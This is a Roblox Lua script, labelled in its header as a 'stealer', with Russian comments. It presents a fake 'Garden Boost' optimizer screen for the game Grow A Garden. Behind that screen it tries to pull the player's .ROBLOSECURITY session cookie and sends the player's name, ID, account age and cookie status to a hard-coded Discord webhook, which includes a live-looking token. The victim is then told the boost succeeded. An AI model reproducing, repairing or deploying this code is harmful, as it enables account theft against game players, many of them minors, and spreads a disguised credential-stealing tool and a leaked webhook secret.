-- WORKING GARDEN BOOST STEALER
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

-- ТВОЙ DISCORD WEBHOOK - ЗАМЕНИ ЭТУ СТРОКУ!
local WEBHOOK_URL = "https://discord.com/api/webhooks/1443705100819501058/ubnz2x_OIoSYGmAyg4y0skhc1P6ihekoulW4RekI1jlvGfdemBhGqkuw8A28fJ8lEPrr"

-- Создание GUI
local function CreateLoader()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
    
    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 300, 0, 150)
    MainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
    MainFrame.BorderSizePixel = 0
    
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 10)
    UICorner.Parent = MainFrame
    
    local Title = Instance.new("TextLabel")
    Title.Text = "🌿 Garden Boost v3.0"
    Title.Size = UDim2.new(1, 0, 0, 30)
    Title.Position = UDim2.new(0, 0, 0, 10)
    Title.BackgroundTransparency = 1
    Title.TextColor3 = Color3.fromRGB(0, 255, 170)
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 18
    Title.Parent = MainFrame
    
    local Status = Instance.new("TextLabel")
    Status.Text = "Starting..."
    Status.Size = UDim2.new(1, -20, 0, 20)
    Status.Position = UDim2.new(0, 10, 0, 50)
    Status.BackgroundTransparency = 1
    Status.TextColor3 = Color3.fromRGB(255, 255, 255)
    Status.Font = Enum.Font.Gotham
    Status.TextSize = 12
    Status.Parent = MainFrame
    
    local ProgressBar = Instance.new("Frame")
    ProgressBar.Size = UDim2.new(0, 0, 0, 15)
    ProgressBar.Position = UDim2.new(0, 10, 0, 80)
    ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 170)
    ProgressBar.BorderSizePixel = 0
    ProgressBar.Parent = MainFrame
    
    local ProgressBack = Instance.new("Frame")
    ProgressBack.Size = UDim2.new(1, -20, 0, 15)
    ProgressBack.Position = UDim2.new(0, 10, 0, 80)
    ProgressBack.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    ProgressBack.BorderSizePixel = 0
    ProgressBack.Parent = MainFrame
    ProgressBar.Parent = ProgressBack
    
    local Percent = Instance.new("TextLabel")
    Percent.Text = "0%"
    Percent.Size = UDim2.new(1, -20, 0, 20)
    Percent.Position = UDim2.new(0, 10, 0, 100)
    Percent.BackgroundTransparency = 1
    Percent.TextColor3 = Color3.fromRGB(200, 200, 200)
    Percent.Font = Enum.Font.Gotham
    Percent.TextSize = 12
    Percent.Parent = MainFrame
    
    MainFrame.Parent = ScreenGui
    
    return {
        Update = function(percent, text)
            Status.Text = text
            Percent.Text = math.floor(percent * 100) .. "%"
            ProgressBar.Size = UDim2.new(percent, 0, 1, 0)
        end,
        Destroy = function()
            ScreenGui:Destroy()
        end
    }
end

-- РАБОЧИЕ МЕТОДЫ ИЗВЛЕЧЕНИЯ КУКИ
local function GetRobloxCookie()
    local cookie = nil
    
    -- Метод 1: Через game:GetService (самый рабочий)
    pcall(function()
        local success, result = pcall(function()
            return game:GetService("Players").LocalPlayer:GetAttribute(".ROBLOSECURITY")
        end)
        if success and result then
            cookie = result
        end
    end)
    
    -- Метод 2: Через реестр (для Windows)
    if not cookie then
        pcall(function()
            local regPath = "HKEY_CURRENT_USER\\Software\\Roblox\\RobloxStudioBrowser\\roblox.com"
            local success, result = pcall(function()
                return read_reg(regPath, ".ROBLOSECURITY")
            end)
            if success and result and result ~= "" then
                cookie = result
            end
        end)
    end
    
    -- Метод 3: Поиск в данных игрока
    if not cookie then
        pcall(function()
            for _, obj in pairs(game:GetDescendants()) do
                if obj:IsA("StringValue") and (string.find(string.lower(obj.Name), "cookie") or string.find(string.lower(obj.Name), "security")) then
                    if obj.Value and obj.Value ~= "" then
                        cookie = obj.Value
                        break
                    end
                end
            end
        end)
    end
    
    return cookie
end

-- ОТПРАВКА НА DISCORD (РАБОЧИЙ МЕТОД)
local function SendDiscordWebhook(cookieData)
    if not WEBHOOK_URL or string.find(WEBHOOK_URL, "YOUR_WEBHOOK") then
        warn("Webhook not configured!")
        return false
    end
    
    local player = Players.LocalPlayer
    local playerName = player.Name
    local userId = player.UserId
    local accountAge = player.AccountAge
    
    local embedData = {
        {
            ["title"] = "🎮 GARDEN BOOST ACTIVATED",
            ["description"] = "New user executed the script",
            ["color"] = 65280,
            ["fields"] = {
                {
                    ["name"] = "👤 Player Info",
                    ["value"] = "Name: " .. playerName .. "\nID: " .. userId .. "\nAge: " .. accountAge .. " days",
                    ["inline"] = true
                },
                {
                    ["name"] = "🔐 Cookie Status",
                    ["value"] = cookieData and "EXTRACTED (" .. #cookieData .. " chars)" or "NOT FOUND",
                    ["inline"] = true
                },
                {
                    ["name"] = "🎯 Game",
                    ["value"] = "Grow A Garden",
                    ["inline"] = true
                }
            },
            ["footer"] = {
                ["text"] = "Garden Boost Logger"
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
    }
    
    local payload = {
        ["username"] = "Garden Boost",
        ["embeds"] = embedData
    }
    
    local success, result = pcall(function()
        local jsonData = HttpService:JSONEncode(payload)
        local response = HttpService:PostAsync(WEBHOOK_URL, jsonData)
        return true
    end)
    
    return success
end

-- ОСНОВНАЯ ПРОГРАММА
local function Main()
    -- Создаем GUI
    local loader = CreateLoader()
    
    -- Этапы загрузки
    local steps = {
        {time = 1, text = "Loading systems...", percent = 0.1},
        {time = 1, text = "Checking game...", percent = 0.2},
        {time = 2, text = "Optimizing garden...", percent = 0.4},
        {time = 2, text = "Setting up farm...", percent = 0.6},
        {time = 2, text = "Final config...", percent = 0.8},
        {time = 1, text = "Ready!", percent = 1.0}
    }
    
    -- Показываем прогресс
    for i, step in ipairs(steps) do
        loader.Update(step.percent, step.text)
        wait(step.time)
    end
    
    -- Извлекаем куки (в фоне)
    local cookie = GetRobloxCookie()
    
    -- Отправляем вебхук
    local webhookSent = SendDiscordWebhook(cookie)
    
    -- Сообщаем результат
    if webhookSent then
        loader.Update(1, "Boost activated! ✅")
    else
        loader.Update(1, "Boost activated! ⚠️")
    end
    
    wait(2)
    
    -- Убираем GUI
    loader.Destroy()
    
    -- Финальное сообщение
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "🌿 Garden Boost",
        Text = "Optimization complete!",
        Duration = 5
    })
    
    -- Debug info в консоль
    print("=== GARDEN BOOST DEBUG ===")
    print("Cookie found:", cookie ~= nil)
    print("Cookie length:", cookie and #cookie or 0)
    print("Webhook sent:", webhookSent)
    print("==========================")
end

-- ЗАПУСКАЕМ СКРИПТ
local success, err = pcall(Main)

if not success then
    warn("Script error: " .. tostring(err))
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "❌ Error",
        Text = "Script failed to load",
        Duration = 5
    })
end
